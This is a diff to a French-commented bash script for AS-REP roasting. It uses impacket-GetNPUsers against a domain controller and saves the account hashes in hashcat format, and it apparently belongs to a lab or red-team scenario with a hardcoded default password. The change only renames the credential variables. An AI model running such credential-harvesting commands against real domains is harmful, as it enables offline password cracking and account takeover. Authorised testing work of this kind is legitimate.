@@ -4,15 +4,15 @@
 #
 # Usage :
 #   ./asrep_roast.sh                       # creds par défaut
-#   DOMAIN=nyx.tg USER=dir1 PASS='xxx' ./asrep_roast.sh
+#   DOMAIN=nyx.tg AUTH_USER=dir1 AUTH_PASS='xxx' ./asrep_roast.sh
 #   DOMAIN=nyx.tg USERSFILE=./custom_users.txt ./asrep_roast.sh
 
 set -euo pipefail
 
 DOMAIN="${DOMAIN:-nyx.tg}"
 DC_IP="${DC_IP:-10.0.1.20}"
-USER="${USER:-dir1}"
-PASS="${PASS:-Nyx2026!}"
+AUTH_USER="${AUTH_USER:-dir1}"
+AUTH_PASS="${AUTH_PASS:-Nyx2026!}"
 OUTDIR="${OUTDIR:-./logs}"
 OUTFILE="${OUTFILE:-${OUTDIR}/asrep_hashes.txt}"
 USERSFILE="${USERSFILE:-}"
@@ -21,7 +21,7 @@ mkdir -p "${OUTDIR}"
 
 echo "=== S6 — AS-REP Roasting (GetNPUsers) ==="
 echo "  Cible  : ${DC_IP} (${DOMAIN})"
-echo "  User   : ${USER}"
+echo "  User   : ${AUTH_USER}"
 echo "  Output : ${OUTFILE}"
 echo ""
 
@@ -36,7 +36,7 @@ if [ -n "${USERSFILE}" ]; then
 else
     echo "  Users  : énumération automatique (via creds fournis)"
     impacket-GetNPUsers \
-        "${DOMAIN}/${USER}:${PASS}" \
+        "${DOMAIN}/${AUTH_USER}:${AUTH_PASS}" \
         -dc-ip "${DC_IP}" \
         -request \
         -format hashcat \
